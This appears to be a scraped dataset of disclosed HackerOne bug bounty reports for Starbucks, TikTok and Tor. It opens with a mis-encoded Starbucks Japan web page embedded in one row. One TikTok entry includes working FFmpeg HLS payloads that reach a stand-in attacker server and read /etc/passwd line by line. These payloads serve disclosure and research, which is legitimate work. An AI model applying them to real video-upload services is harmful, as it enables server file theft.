5<?php include(_SB_DIR_INCLUDE_.""/common/meta.html""); ?>
6<link type=""text/css"" rel=""stylesheet"" href=""/common/css/contents.css"" media=""screen,print"">
7<link type=""text/css"" rel=""stylesheet"" href=""/howto/store/css/index.css"" media=""screen,print"">
8<link type=""text/css"" rel=""stylesheet"" href=""/howto/css/howto.css"" media=""screen,print"">
9<?php include(_SB_DIR_INCLUDE_.""/common/css-pc.html""); ?>
10<?php include(_SB_DIR_INCLUDE_.""/common/js-old.html""); ?>
11</head>
12<body>
13<noscript>
14<p class=""noscript"">å½“ã‚µã‚¤ãƒˆã‚’ã”è¦§ã„ãŸã ãã«ã¯ãƒ–ãƒ©ã‚¦ã‚¶ã®è¨å®šã§<strong>JavaScriptã‚’æœ‰åŠ¹ã«è¨å®š</strong>ã™ã‚‹å¿…è¦ãŒã”ã–ã„ã¾ã™ã€‚</p>
15</noscript>
16<?php include(_SB_DIR_INCLUDE_.""/common/welcome.html""); ?>
17<?php include(_SB_DIR_INCLUDE_.""/common/header.html""); ?>
18<?php include(_SB_DIR_INCLUDE_.""/common/title-scroll.html""); ?>
19<div class=""mainContents static migration withLocalNav"">
20<article>
21<header class=""local"">
22<h2><?php echo $pageProperties['title']; ?></h2>
23<?php include(_SB_DIR_INCLUDE_.""/common/sns.html""); ?>
24<ul class=""backLinks"">
25<li><a href=""/howto/"">
26<div><p>How to STARBUCKS</p></div>
27</a></li>
28</ul>
29</header>
30<div class=""mainArea typeWithSideA"">
31<div id=""contentsMainIn"" class=""newContents"">
32<div class=""container"">
33<h3 class=""order mT0"">1.ãƒ“ãƒãƒ¬ãƒƒã‚¸ã‚’é¸ã³ã¾ã—ã‚‡ã†ã€‚</h3>
34<p>ã‚³ãƒ¼ãƒ’ãƒ¼ã‚„ãƒ•ãƒ©ãƒšãƒãƒ¼ãƒŽã®ä»–ã‚‚ã€ã‚³ã‚³ã‚¢ã‚„ã‚¸ãƒ¥ãƒ¼ã‚¹ã‚‚ã”ç”¨æ„ã—ã¦ã„ã¾ã™ã€‚</p>
35<ul class=""listInline becerage mB35"">
36<li><img src=""/howto/store/images/img-order-coffee.jpg"" width=""159"" height=""218"" alt=""ã‚³ãƒ¼ãƒ’ãƒ¼ é«˜å“è³ªã®ã‚¢ãƒ©ãƒ“ã‚«ç¨®ã‚³ãƒ¼ãƒ’ãƒ¼è±†ã‚’ä½¿ç”¨ã—ãŸå®šç•ªãƒ“ãƒãƒ¬ãƒƒã‚¸ã€‚""></li>
37<li><img src=""/howto/store/images/img-order-espresso.jpg"" width=""160"" height=""218"" alt=""ã‚¨ã‚¹ãƒ—ãƒ¬ãƒƒã‚½ ãƒ“ãƒãƒ¬ãƒƒã‚¸ å®Œç’§ã«æŠ½å‡ºã•ã‚ŒãŸã‚¨ã‚¹ãƒ—ãƒ¬ãƒƒã‚½ã‚’ä½¿ç”¨ã—ãŸãƒ“ãƒãƒ¬ãƒƒã‚¸ã€‚""></li>
38<li><img src=""/howto/store/images/img-order-frappuccino.jpg"" width=""159"" height=""218"" alt=""ãƒ•ãƒ©ãƒšãƒãƒ¼ãƒŽÂ® ä¸€å¹´ã‚’é€šã—ã¦ç¾Žå‘³ã—ãæ¥½ã—ã‚ã‚‹ã€ãƒ•ãƒãƒ¼ã‚ºãƒ³ãƒ“ãƒãƒ¬ãƒƒã‚¸ã€‚""></li>
39<li class=""lastChild""><img src=""/howto/store/images/img-order-tea.jpg"" width=""155"" height=""218"" alt=""ãƒ†ã‚£ãƒ¼ãƒ“ãƒãƒ¬ãƒƒã‚¸ãƒ»ãã®ä»– ãƒ†ã‚£ãƒ¼ã€ã‚³ã‚³ã‚¢ã€100ï¼…ã‚¸ãƒ¥ãƒ¼ã‚¹ãªã©ã‚‚ã‚ã‚Šã¾ã™ã€‚""></li>
40</ul>
41<div class=""listWithTypeA"">
42<p class=""mB15"">å®šç•ªãƒ“ãƒãƒ¬ãƒƒã‚¸ã®ã»ã‹ã«ã‚‚ã€å£ç¯€ã«åˆã‚ã›ãŸãŠã™ã™ã‚ã®ãƒ“ãƒãƒ¬ãƒƒã‚¸ã‚‚ã”ç”¨æ„ã—ã¦ã„ã¾ã™ã€‚</p>
43<ul class=""links mB30"">
44<li><a href=""/beverage/"">ãƒ“ãƒãƒ¬ãƒƒã‚¸ãƒ¡ãƒ‹ãƒ¥ãƒ¼ä¸€è¦§</a></li>
45</ul>
46<p class=""lightFontS mB0"">My Starbucksä¼šå“¡ã®çš†æ§˜ã«ã¯ã€å£ç¯€é™å®šã®ãƒ“ãƒãƒ¬ãƒƒã‚¸ã‚’ã„ã¡æ—©ãç¢ºèªã§ãã‚‹å…ˆè¡Œå‘ŠçŸ¥ã‚’è¡Œã£ã¦ãŠã‚Šã¾ã™ã€‚</p>
47<p class=""itemNotes mB15"">ç™»éŒ²ã¯ç„¡æ–™ã§ã™</p>
48<ul class=""links"">
49<li><a href=""/register/mystarbucks/input/#input"">My Starbucksä¼šå“¡ç™»éŒ²</a></li>
50</ul>
51<!-- /.listWithTypeA --></div>
52<!-- /.container --></div>
53<div class=""container"">
54<h3 class=""order"">2.ã‚µã‚¤ã‚ºã‚‚ã„ã‚ã„ã‚ã€‚</h3>
55<p>é£²ã¿ãŸã„é‡ã‚’é£²ã¿ãŸã„ã ã‘ã€‚ã‚µã‚¤ã‚ºã¯4ç¨®é¡žã‹ã‚‰ãŠé¸ã³ãã ã•ã„ã€‚</p>
56<ul class=""listInline size"">
57<li><img src=""/howto/store/images/index-img-short.jpg"" width=""155"" height=""205"" alt=""ã‚·ãƒ§ãƒ¼ãƒˆ Shortï¼ˆ240mlï¼‰""></li>
58<li><img src=""/howto/store/images/index-img-tall.jpg"" width=""155"" height=""205"" alt=""ãƒˆãƒ¼ãƒ« Tallï¼ˆ350mlï¼‰""></li>
59<li><img src=""/howto/store/images/index-img-grande.jpg"" width=""155"" height=""205"" alt=""ã‚°ãƒ©ãƒ³ãƒ‡ Grandeï¼ˆ470mlï¼‰""></li>
60<li class=""lastChild""><img src=""/howto/store/images/index-img-venti.jpg"" width=""155"" height=""205"" alt=""ãƒ™ãƒ³ãƒ†ã‚£ VentiÂ®ï¼ˆ590mlï¼‰""></li>
61</ul>
62<ul class=""notes light fontS"">
63<li><span class=""mark"">â€»</span>å„ã‚µã‚¤ã‚ºã®å®¹é‡ã¯ã€ç›®å®‰ã§ã™ã€‚</li>
64<li><span class=""mark"">â€»</span>ã‚¢ã‚¤ã‚¹ãƒ‰ãƒªãƒ³ã‚¯ã®ã‚·ãƒ§ãƒ¼ãƒˆã‚µã‚¤ã‚ºã¯300mlã§ã™ã€‚</li>
65</ul>
66<!-- /.container --></div>
67<div class=""container last"">
68<h3 class=""order"">3.ãƒ“ãƒãƒ¬ãƒƒã‚¸ã‚’è‡ªåˆ†å¥½ã¿ã®å‘³ã‚ã„ã«ã€‚</h3>
69<p>ãƒ“ãƒãƒ¬ãƒƒã‚¸ã¯ãŠå¥½ã¿ã«åˆã‚ã›ã¦ã€è‡ªç”±ã«ã‚«ã‚¹ã‚¿ãƒžã‚¤ã‚ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
70<div class=""col"">
71<div class=""col2"">
72<h4 class=""order"">ãƒ¬ã‚¸ã§ <span>at Cash register</span></h4>
73<p class=""mB20""><img src=""/howto/store/images/img-order-arrange.jpg"" alt=""ãƒŸãƒ«ã‚¯ã‚’é¸ã‚“ã ã‚Š ã‚·ãƒãƒƒãƒ—ã‚„ã‚½ãƒ¼ã‚¹ã‚’è¿½åŠ ã—ãŸã‚Š ã‚¨ã‚¹ãƒ—ãƒ¬ãƒƒã‚½ã‚·ãƒ§ãƒƒãƒˆã‚’è¿½åŠ ã—ã¦é¢¨å‘³ã‚’ã‚ˆã‚Šæ·±ã"" width=""318"" height=""154""></p>
74<p class=""tasteTxt mB0"">ã‚ªãƒ¼ãƒ€ãƒ¼æ™‚ã«ã€ãƒãƒªã‚¹ã‚¿ã«ãŠå°‹ããã ã•ã„ã€‚<br>
75ãŠå¥½ã¿ã®å‘³ã‚’è¦‹ã¤ã‘ã‚‹ãŠæ‰‹ä¼ã„ã‚’ã•ã›ã¦ã„ãŸã ãã¾ã™ã€‚<br>
76è‡ªåˆ†ã«ã´ã£ãŸã‚Šã®å‘³ã«å‡ºä¼šãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚</p>
77<!-- /.col2 --></div>
78<div class=""col2"">
79<h4 class=""order"">ã‚³ãƒ³ãƒ‡ã‚£ãƒ¡ãƒ³ãƒˆãƒãƒ¼ã§ <span>at Condiment bar</span></h4>
80<p class=""mB20""><img src=""/howto/store/images/img-order-bar.jpg"" alt="""" width=""318"" height=""154""></p>
81<p class=""tasteTxt mB0"">ã‚³ãƒ³ãƒ‡ã‚£ãƒ¡ãƒ³ãƒˆãƒãƒ¼ã§ãŠå¥½ã¿ã®å‘³ã‚ã„ã«ã€‚<br>
82ã‚³ãƒ¼ãƒ’ãƒ¼ã‚„ç´…èŒ¶ã«åŠ ãˆã‚‹ãƒŸãƒ«ã‚¯ã¯2ç¨®é¡žã€‚ãŠç ‚ç³–ã¯3ç¨®é¡žã€‚é¦™ã‚Šè±Šã‹ã«ãªã‚‹ãƒ‘ã‚¦ãƒ€ãƒ¼ãªã©ã‚‚ã”ç”¨æ„ã—ã¦ã„ã¾ã™ã€‚</p>
83<!-- /.col2 --></div>
84<!-- /.col --></div>
85<div class=""withImgCol listWithTypeB mB45"">
86<ul class=""btns row imgR mT3"">
87<li><a href=""/howto/customize/index.html"">How to ã‚«ã‚¹ã‚¿ãƒžã‚¤ã‚º</a></li>
88</ul>
89<p class=""txtL"">ã‚«ã‚¹ã‚¿ãƒžã‚¤ã‚ºã«ã¤ã„ã¦è©³ã—ãã¯ã“ã¡ã‚‰ã§ã€‚</p>
90<!-- /.withImgCol.listWithTypeB.mB45 --></div>
91<div class=""arrangeBorderWrap"">
92<div class=""arrangeBorder pT30 pB10"">
93<div class=""withImgCol"">
94<p class=""imgL""><img src=""/howto/store/images/img-order-lid.jpg"" alt="""" width=""160"" height=""97""></p>
95<div class=""txtR"">
96<h4 class=""order"">ã“ã®ãƒ•ã‚¿ã€å–ã‚‰ãšã«é£²ã‚“ã§ã¿ã¦ã€‚</h4>
97<p>æ©ããªãŒã‚‰ã‚³ãƒ¼ãƒ’ãƒ¼ã‚’æ¥½ã—ã‚“ã ã‚Šã€æ¸©ã‹ãä¿ã¤åŠ¹æžœã¯ã‚‚ã¡ã‚ã‚“ã€<br>
98ã“ã®ãƒ•ã‚¿ã«é–‹ã„ãŸå°ã•ãªé£²ã¿å£ã‹ã‚‰ç›´æŽ¥é£²ã‚€ã¨ã€ãƒ•ã‚©ãƒ¼ãƒ ãƒŸãƒ«ã‚¯ã‚„ãƒ›ã‚¤ãƒƒãƒ—ã‚¯ãƒªãƒ¼ãƒ ãŒç¨‹ã‚ˆãæ··ã–ã‚Šåˆã„ã€æœ€å¾Œã¾ã§ãŠã„ã—ãå‘³ã‚ãˆã¾ã™ã€‚ãœã²ãŠè©¦ã—ãã ã•ã„ã€‚</p>
99<!-- /.txtR --></div>
100<!-- /.withImgCol --></div>
101<!-- /.arrangeBorder.pT30.pB10 --></div>
102<div class=""arrangeBorder last pT30"">
103<div class=""withImgCol"">
104<p class=""imgL""><img src=""/howto/store/images/img-order-bring.jpg"" alt="""" width=""160"" height=""119""></p>
105<div class=""txtR"">
106<h4 class=""order"">Bring My Cup</h4>
107<p class=""mB15"">ãƒ‰ãƒªãƒ³ã‚¯ã‚’ã”è³¼å…¥ã®éš›ã€ã”è‡ªåˆ†ã®ã‚¿ãƒ³ãƒ–ãƒ©ãƒ¼ã‚„ãƒžã‚°ã‚«ãƒƒãƒ—ã‚’ãŠæŒã¡ã„ãŸã ãã¨ã€<br>
108è³‡æºã®ç¯€ç´„ã«ã”å”åŠ›ã„ãŸã ã„ãŸãŠç¤¼ã¨ã—ã¦ã€ç¨ŽæŠœæœ¬ä½“ä¾¡æ ¼ã‹ã‚‰20å††å€¤å¼•ã—ã¾ã™ã€‚<br>
109<ul class=""links mB30"">
110<li><a href=""http://www.starbucks.co.jp/csr/environment/green_stores.html"">ã‚¹ã‚¿ãƒ¼ãƒãƒƒã‚¯ã‚¹ç’°å¢ƒã¸ã®å–ã‚Šçµ„ã¿</a></li>
111</ul>
112<p class=""txtR"">ãŠæ°—ã«å…¥ã‚Šã®ãƒ‰ãƒªãƒ³ã‚¯ã‚’ã€ãŠæ°—ã«å…¥ã‚Šã®ã‚¿ãƒ³ãƒ–ãƒ©ãƒ¼ã«å…¥ã‚Œã¦ã€‚<br>
113ä¿æ¸©æ€§ã«å„ªã‚ŒãŸã‚¿ãƒ³ãƒ–ãƒ©ãƒ¼ãªã‚‰ã€å¥½ããªã¨ãã«å¥½ããªå ´æ‰€ã§ãŠã„ã—ãå‘³ã‚ãˆã¾ã™ã€‚</p>
114<!-- /.txtR --></div>
115<!-- /.withImgCol --></div>
116<!-- /.arrangeBorder.last.pT30 --></div>
117<!-- /.arrangeBorderWrap --></div>
118<!-- /.container.last --></div>
119<!-- /.newContents --></div>
120<ul class=""backLinks"">
121<li><a href=""/howto/"">
122<div><p>How to STARBUCKS</p></div>
123</a></li>
124</ul>
125<!-- /.mainArea.typeWithSideA --></div>
126<nav class=""localNav"">
127<div class=""sideBar"">
128<ul class=""backLinks"">
129<li><a href=""/howto/"">How to STARBUCKS</a></li>
130</ul>
131<ul class=""navList"">
132<li class=""is-located"">
133<p>ãƒ“ãƒãƒ¬ãƒƒã‚¸ã‚’é¸ã¶<span>How to ã‚ªãƒ¼ãƒ€ãƒ¼</span></p>
134</li>
135<li><a href=""/howto/customize/"">
136<p>ã‚«ã‚¹ã‚¿ãƒžã‚¤ã‚ºã«ãƒˆãƒ©ã‚¤<span>How to ã‚«ã‚¹ã‚¿ãƒžã‚¤ã‚º</span></p></a></li>
137<li class=""linkParent"">
138<p>ã‚¹ãƒžãƒ¼ãƒˆã«æ¥½ã—ã‚€</p>
139</li>
140<li class=""lower""><a href=""/howto/store/tumbler.html"">
141<p><span>ã‚¿ãƒ³ãƒ–ãƒ©ãƒ¼</span></p></a></li>
142<li class=""lower""><a href=""/howto/card/"">
143<p><span>ã‚¹ã‚¿ãƒ¼ãƒãƒƒã‚¯ã‚¹ ã‚«ãƒ¼ãƒ‰</span></p></a></li>
144<li><a href=""/howto/food/"">
145<p>ãƒ•ãƒ¼ãƒ‰ã¨ã‚³ãƒ¼ãƒ’ãƒ¼ã‚’æ¥½ã—ã‚€</p></a></li>
146<li><a href=""/customize/"">
147<p>ãŠæ°—ã«å…¥ã‚Šã®ä¸€æ¯ã‚’ã•ãŒã™</p></a></li>
148<li><a href=""/howto/coffee/"">
149<p>è‡ªå®…ã§æ¥½ã—ã‚€<span>at Home</span></p></a></li>
150<li class=""lower""><a href=""/howto/coffee/beans.html"">
151<p><span>ã‚³ãƒ¼ãƒ’ãƒ¼è±†ã‚’é¸ã¶</span></p></a></li>
152<li class=""lower""><a href=""/howto/coffee/passport.html"">
153<p><span>ã‚³ãƒ¼ãƒ’ãƒ¼ãƒ‘ã‚¹ãƒãƒ¼ãƒˆï¼†ãƒ“ãƒ¼ãƒ³ã‚ºã‚«ãƒ¼ãƒ‰</span></p></a></li>
154<li class=""lower""><a href=""/howto/coffee/skill.html"">
155<p><span>ãŠã„ã—ã„ã‚³ãƒ¼ãƒ’ãƒ¼ã‚’ã„ã‚Œã‚‹ã‚³ãƒ„</span></p></a></li>
156<li class=""lower""><a href=""/howto/coffee/seminar-kigu.html"">
157<p><span>ã‚³ãƒ¼ãƒ’ãƒ¼ã‚»ãƒŸãƒŠãƒ¼/ã‚³ãƒ¼ãƒ’ãƒ¼å™¨å…·</span></p></a></li>
158<li><a href=""/howto/office/"">
159<p>ã‚ªãƒ•ã‚£ã‚¹ã§æ¥½ã—ã‚€<span>at Office</span></p></a></li>
160<li><a href=""/howto/mystarbucks/"">
161<p>My Starbucksã§æ¥½ã—ã‚€<span>ä¼šå“¡ç™»éŒ²</span></p></a></li>
162<li><a href=""/howto/index.html#andMore"">
163<p>ä¾¿åˆ©ãªã‚µãƒ¼ãƒ“ã‚¹</p></a></li>
164</ul>
165<!-- /.sideBar --></div>
166</nav>
167<?php include(_SB_DIR_INCLUDE_.""/common/sns-footer.html""); ?>
168</article>
169<!-- /.mainContents.static.migration.withLocalNav --></div>
170<?php include(_SB_DIR_INCLUDE_.""/common/footer.html""); ?>
171<?php include(_SB_DIR_INCLUDE_.""/common/nav-os.html""); ?>
172</body>
173</html>Summary by linkkshttps://t.me/Bugbountygroup",https://hackerone.com/reports/389454,Washington,United States,Seattle,2018,8,1,21,44
Starbucks,10001,0.0,over-1b,$500.00,High,7.95,SQL Injection,Blind SQL Injection on starbucks.com.gt and WAF Bypass  :*,d3417_  submitted a report to Starbucks.Apr 27th (4 years ago),https://hackerone.com/reports/549355,Washington,United States,Seattle,2019,4,27,15,23
Starbucks,10001,0.0,over-1b,"$4,000.00",Critical,9.3,SQL Injection,"Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice",geek_jeremy  submitted a report to Starbucks.May 29th (3 years ago),https://hackerone.com/reports/592400,Washington,United States,Seattle,2019,5,29,18,28
Starbucks,10001,0.0,over-1b,"$1,000.00",High,7.95,Improper Access Control - Generic,Bug in GraphQL and API integration leads to limited user address disclosure,loxiran  submitted a report to Starbucks.Jan 1st (4 years ago),https://hackerone.com/reports/473742,Washington,United States,Seattle,2019,1,1,11,18
Starbucks,10001,0.0,over-1b,"$1,000.00",High,8.4,Privilege Escalation,Bulgaria - Subdomain takeover of mail.starbucks.bg,"nukedx  submitted a report to Starbucks.Nov 13th (3 years ago)Summary by nukedxI was checking Rapid7's fdns dataset for my academic research about cloud services and security issues related with them, a part of research is focused on subdomain hijacking, since Starbucks had some historic reports related to it, I scanned *.starbucks.* on entire dataset, figured out mail.starbucks.bg was pointing unclaimed service from icn.bg, claimed profile and successfully hijacked subdomain with it.
Unfortunately this was only giving mail hosting capabilities so it wasn't full subdomain takeover, kudos for Starbucks team to still accepting this and rewarding it despite being not full subdomain takeover.
It's always pleasure to report Starbucks, they always handle all reports professionally. I hope in future I'll work with them again.",https://hackerone.com/reports/736863,Washington,United States,Seattle,2019,11,13,14,4
Starbucks,10001,0.0,over-1b,"$1,000.00",High,7.5,Privilege Escalation,China - president-starbucks.com.cn DNS configuration reported as takeover,k3mlol  submitted a report to Starbucks.Oct 13th (4 years ago),https://hackerone.com/reports/423269,Washington,United States,Seattle,2018,10,13,9,30
Starbucks,10001,0.0,over-1b,"$4,000.00",Critical,9.5,Information Disclosure,China – Limited Partner PII Regarding Work Scheduling via Unauthenticated API Endpoint,0xpatrik  submitted a report to Starbucks.Jul 25th (3 years ago),https://hackerone.com/reports/659248,Washington,United States,Seattle,2019,7,25,9,9
TikTok,10001,0.0,over-1b,"$2,373.00",High,7.5,Cross-Site Request Forgery (CSRF),[CSRF] TikTok Careers Portal Account Takeover,"lauritz  submitted a report to TikTok.Oct 17th (2 years ago)Summary by lauritzI wrote a short blog post that covers this report. 
If you have any feedback, feel free to ping me at Twitter. 🙂",https://hackerone.com/reports/1010522,Beijing,China,Beijing,2020,10,17,8,41
TikTok,10001,0.0,over-1b,$418.00,Medium,5.0,Privacy Violation,Blocked user can see live video,sandipgyawali  submitted a report to TikTok.Dec 29th (2 years ago),https://hackerone.com/reports/1067967,Beijing,China,Beijing,2020,12,29,4,29
TikTok,10001,0.0,over-1b,$50.00,Low,2.0,Improper Access Control - Generic,"Bypass ""Industry Documents"" Validation",gnux  submitted a report to TikTok.Oct 4th (2 years ago),https://hackerone.com/reports/997514,Beijing,China,Beijing,2020,10,4,7,26
TikTok,10001,0.0,over-1b,$500.00,Medium,4.3,Improper Access Control - Generic,BYPASSING COMMENTING ON RESTRICTED  AUDIENCE VIDEOS,boynamedboy  submitted a report to TikTok.Sep 12th (about 1 year ago),https://hackerone.com/reports/1337351,Beijing,China,Beijing,2021,9,12,6,31
TikTok,10001,0.0,over-1b,"$3,860.00",High,8.2,Cross-site Scripting (XSS) - Reflected,Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration,"milly  submitted a report to TikTok.Aug 26th (2 years ago)Summary by millyWhile fuzzing, I discovered a URL parameter reflecting its value without being properly sanitized. Thus, I was able to achieve reflected XSS. In addition, I found an endpoint which was vulnerable to CSRF.
The endpoint enabled me to set a new password on accounts which had used third-party apps to sign-up. I combined both vulnerabilities by crafting a simple JavaScript payload - triggering the CSRF - which I injected into the vulnerable URL parameter from earlier, to archive a ""one click account takeover"".",https://hackerone.com/reports/968082,Beijing,China,Beijing,2020,8,26,20,7
TikTok,10001,0.0,over-1b,"$2,373.00",High,7.5,Insecure Direct Object Reference (IDOR),"Cross-Tenant IDOR ( graphql `AddRulesToPixelEvents` query ) allowing to add, update, and delete rules of any Pixel events on the platform","freesec  submitted a report to TikTok.Sep 17th (2 years ago)Summary by freesecThis report is one of my firsts on the TikTok Ads portal
The Pixel events usedd by the campaigns created by the advertiser are mainly managed through GraphQl requests.
Through a single request the advertiser can Add and/or Modify and/or Delete Pixel events.
There were some IDORs weaknesses through this requests allowing to a bad advertiser to perform all these actions on any other Pixel Events of any other Adversiters.",https://hackerone.com/reports/984965,Beijing,China,Beijing,2020,9,17,20,36
TikTok,10001,0.0,over-1b,"$1,000.00",Medium,5.7,Cross-Site Request Forgery (CSRF),CSRF on TikTok Ads Portal,probatorem  submitted a report to TikTok.Jan 26th (2 years ago),https://hackerone.com/reports/1087436,Beijing,China,Beijing,2021,1,26,11,27
TikTok,10001,0.0,over-1b,$200.00,Medium,5.45,Cross-Site Request Forgery (CSRF),CSRF To Add New App In Developer Account And Bypassing Json Format,sniper302  submitted a report to TikTok.Oct 4th (2 years ago),https://hackerone.com/reports/997615,Beijing,China,Beijing,2020,10,4,11,56
TikTok,10001,0.0,over-1b,"$2,727.00",High,7.7,Server-Side Request Forgery (SSRF),External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing,"ach  submitted a report to TikTok.Dec 20th (2 years ago)Summary by achSummary:
FFmpeg is a free and open-source software project consisting of a large suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the FFmpeg program itself, designed for command-line-based processing of video and audio files. It is widely used for format transcoding, basic editing (trimming and concatenation), video scaling, video post-production effects and standards compliance (SMPTE, ITU).
FFmpeg includes libavcodec, an audio/video codec library used by many commercial and free software products, libavformat (Lavf), an audio/video container mux and demux library, and the core ffmpeg command-line program for transcoding multimedia files.
The SSRF-LFR in FFmpeg is pretty well known and old vulnerability but luckily I was able to find and exploit it in https://www.tiktok.com/upload/ functionality.
At first I couldn't exploit LFR and only got SSRF to my collaborator server.
After some digging I found out that the problem was that my text editor added new line(\r\n) at the end of header.m3u8 file.
Also this vulnerability leads to DOS but I decided not to test this issue.
Exploitation:
SSRF
For SSRF you just need to upload .avi file with injected HLS-directives inside.
Example:
Code 91 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:10.0,
4http://yourserver.com/anything
5#EXT-X-ENDLIST
After that you will get a callback to your server. The user-agent will have Lavf(libavformat) version.
LFR
In order to exploit LFR you need to host special file on your server and refer to it inside the video you wanna upload.
Example:
header.m3u8 file you need to host at your server:
Code 64 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:,
4http://yourserver.com?
Make sure that your header.m3u8 doesn't have anything after 3f byte(? sign). You can check that with hexdump -C header.m3u8
video.avi
You need to inject these commands inside video.avi file:
Code 120 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:10.0,
4concat:http://yourserver.com/header.m3u8|file:///etc/passwd
5#EXT-X-ENDLIST
After uploading video.avi you will receive only first line of /etc/passwd file.
But we need more, right?
To exfiltrate the whole file(any file). We can use two techniques. 

using header.y4m(you can find it in referenced links):

Code 43 Bytes1YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono
2FRAME
This didn't work for me.
Subfile technique
In order to exfiltrate the whole file line by line you can use this directives:
Code 142 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:10.0,
4concat:http://yourserver.com/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd
5#EXT-X-ENDLIST
start parameter and it's value(1) means that we start from first symbol of the file and the end parameter symbolises the end of the line. There is no need to know exact end value. After getting first line you can easily calculate the start value of second line and so on.
For example for the second line our command wiil be something like:
concat:http://yourserver.com/header.m3u8|subfile,,start,70,end,10000,,:/etc/passwd
In some cases you can extract the whole file with this directive inside you video file:
Code 103 Bytes1#EXTM3U
2#EXT-X-MEDIA-SEQUENCE:0
3#EXTINF:1.0
4/anything.txt
5#EXTINF:1.0
6file:///etc/passwd
7#EXT-X-ENDLIST
You could see the whole /etc/passwd as video preview.
But in our case the vulnerable software worked while our video got converted on the server side.
All of the examples of video files and files with directives you can find in referenced links and by just googling it.
References

https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yngwie_ffmpeg.pdf
https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf
https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
Show more",https://hackerone.com/reports/1062888,Beijing,China,Beijing,2020,12,20,11,13
TikTok,10001,0.0,over-1b,"$2,500.00",Medium,6.5,Insecure Direct Object Reference (IDOR),IDOR the ability to view support tickets of any user on seller platform,lewaperbb  submitted a report to TikTok.Nov 5th (about 1 year ago),https://hackerone.com/reports/1392630,Beijing,China,Beijing,2021,11,5,22,43
TikTok,10001,0.0,over-1b,"$3,860.00",High,8.2,Improper Restriction of Authentication Attempts,Lack of rate limitation on careers site allows the attacker to brute force the verification code,iambouali  submitted a report to TikTok.Jan 11th (2 years ago),https://hackerone.com/reports/1075827,Beijing,China,Beijing,2021,1,11,0,36
TikTok,10001,0.0,over-1b,"$11,214.00",Critical,9.6,Improper Export of Android Application Components,Multiple bugs leads to RCE on TikTok for Android,dphoeniixx  submitted a report to TikTok.Dec 23rd (2 years ago),https://hackerone.com/reports/1065500,Beijing,China,Beijing,2020,12,23,21,47
TikTok,10001,0.0,over-1b,"$4,500.00",Medium,4.7,Cross-site Scripting (XSS) - Reflected,Reflected XSS in TikTok endpoints,sh1yo  submitted a report to TikTok.Sep 25th (about 1 year ago),https://hackerone.com/reports/1350887,Beijing,China,Beijing,2021,9,25,5,49
TikTok,10001,0.0,over-1b,"$12,582.00",Critical,9.9,Code Injection,RCE on TikTok Ads Portal,freesec  submitted a report to TikTok.Nov 2nd (2 years ago)Summary by freesecDuring my research on the TikTok Ads portal I found a RCE thought the video creation process resulting to a root access on the system mainly due to a misconfugration ffmpeg. A simple id and ls commands results were reported and the TikTok team fixed the weakness quickly.,https://hackerone.com/reports/1024575,Beijing,China,Beijing,2020,11,2,17,4
TikTok,10001,0.0,over-1b,"$1,000.00",Medium,4.7,Cross-site Scripting (XSS) - Reflected,reflected xss on the path m.tiktok.com,semsem123  submitted a report to TikTok.Nov 8th (about 1 year ago),https://hackerone.com/reports/1394440,Beijing,China,Beijing,2021,11,8,14,43
Tor,51-100,1.0,1m-10m,$200.00,No value,0.0,Information Disclosure,16 instances where return value of OpenSSL i2d_RSAPublicKey is discarded -- might lead to use of uninitialized memory,"guido  submitted a report to Tor.Jun 2nd (6 years ago)The following functions rely on OpenSSL i2d_RSAPublicKey and do not heed its return value.
Code 2.09 KiBWrap lines Copy Download1int crypto_pk_get_all_digests()
2    tor-0.2.7.6/src/common/tortls.c:775
3        if i2d_RSAPublicKey fails, cert->pkey_digests is all zeroes (cert was allocated with tor_malloc_zero)
4int crypto_pk_get_digest()
5    tor-0.2.7.6/src/or/connection_or.c:1686
6        if i2d_RSAPublicKey fails, digest_rcvd_out is left uninitialized XXX
7        (digest_rcvd_out is a stack-based buffer in connection_tls_finish_handshake and is never initialized)
8    tor-0.2.7.6/src/or/hibernate.c:552
9        if i2d_RSAPublicKey fails, digest is left uninitialized XXX
10    tor-0.2.7.6/src/or/rendcommon.c:482
11        if i2d_RSAPublicKey fails, service_id is left uninitialized XXX
12    tor-0.2.7.6/src/or/rendservice.c:2318
13        if i2d_RSAPublicKey fails, key_digest is left uninitialized XXX
14    tor-0.2.7.6/src/or/router.c:201
15        if i2d_RSAPublicKey fails, server_identitykey_digest is left uninitialized XXX
16    tor-0.2.7.6/src/or/router.c:859
17        if i2d_RSAPublicKey fails, v3_digest is all zeroes (it was initialized with memset) XXX
18    tor-0.2.7.6/src/or/router.c:1019
19        if i2d_RSAPublicKey fails, digest is left uninitialized XXX
20    tor-0.2.7.6/src/or/routerkeys.c:1070
21        if i2d_RSAPublicKey fails, signed_data is left uninitialized XXX
22    tor-0.2.7.6/src/or/routerparse.c:5075
23        if i2d_RSAPublicKey fails, public_key_hash is left uninitialized XXX
24int crypto_pk_get_fingerprint()
25    tor-0.2.7.6/src/or/control.c:1737
26        if i2d_RSAPublicKey fails, answer is left uninitialized XXX
27    tor-0.2.7.6/src/or/dirvote.c:1922
28        if i2d_RSAPublicKey fails, fingerprint is left uninitialized XXX
29    tor-0.2.7.6/src/or/dirvote.c:1923
30        if i2d_RSAPublicKey fails, signing_key_fingerprint is left uninitialized XXX
31    tor-0.2.7.6/src/or/dirvote.c:1946
32        if i2d_RSAPublicKey fails, signing_key_fingerprint is left uninitialized (or retains its previous data) XXX
33int rend_get_service_id()
